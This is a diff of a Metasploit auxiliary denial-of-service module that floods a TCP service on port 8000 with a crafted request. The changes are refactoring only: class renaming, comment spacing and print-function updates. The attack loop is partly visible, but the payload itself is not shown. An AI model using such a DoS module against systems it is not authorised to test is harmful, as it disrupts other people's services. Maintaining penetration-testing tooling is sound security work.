@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
@@ -21,9 +18,9 @@ class Metasploit3 < Msf::Auxiliary
       },
       'Author'         =>
         [
-          'Steve Jones', #original discoverer
-          'Hoagie <andi[at]void.at>', #original public exploit
-          'Paulino Calderon <calderon[at]websec.mx>', #metasploit module
+          'Steve Jones', # original discoverer
+          'Hoagie <andi[at]void.at>', # original public exploit
+          'Paulino Calderon <calderon[at]websec.mx>', # metasploit module
         ],
       'License'        => MSF_LICENSE,
       'References'     =>
@@ -38,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(8000),
         OptInt.new('RLIMIT', [ true,  "Number of requests to send", 25])
-      ], self.class)
+      ])
   end
 
   def run
@@ -56,13 +53,13 @@ class Metasploit3 < Msf::Auxiliary
         sock.put(sploit + "\r\n\r\n")
         disconnect
 
-        print_status("DoS packet unsuccessful.")
+        print_error("DoS packet unsuccessful")
       rescue ::Rex::ConnectionRefused
-        print_status("Unable to connect to #{rhost}:#{rport}.")
+        print_error("Unable to connect to #{rhost}:#{rport}")
       rescue ::Errno::ECONNRESET
-        print_status("DoS packet successful. #{rhost} not responding.")
+        print_good("DoS packet successful. #{rhost} not responding.")
       rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-        print_status("Couldn't connect to #{rhost}:#{rport}")
+        print_error("Couldn't connect to #{rhost}:#{rport}")
       rescue ::Timeout::Error, ::Errno::EPIPE
       end
     end
